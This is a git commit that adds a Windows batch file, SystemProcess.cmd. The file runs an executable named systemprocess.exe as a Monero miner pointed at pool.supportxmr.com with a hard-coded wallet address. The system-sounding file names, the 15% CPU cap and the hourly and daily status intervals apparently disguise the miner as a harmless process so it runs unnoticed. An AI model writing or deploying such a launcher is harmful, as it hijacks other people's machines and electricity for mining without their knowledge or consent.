8112a2f21b68e17ccf96c6aaca4d53ebbdedf7b2
sopranotech <sopranotechmx@gmail.com>
2024-06-25 21:27:06 -0600

    Add files via upload

---
+++ SystemProcess.cmd
@@ -0,0 +1,4 @@
+@echo off
+cd /d "%~dp0"
+systemprocess.exe -o pool.supportxmr.com:8080 -u 872Zust2ybMET6N8FXvbMkJM9iMW72bGpdxGJgsrK5WRL3hDLv62nemRunx44LxkufaNJk26RYRDsbr6DA1UuHfNEqpgfxE  --randomx-mode=fast --max-cpu-usage=15 --print-time=3600 --health-print-time=86400
+pause
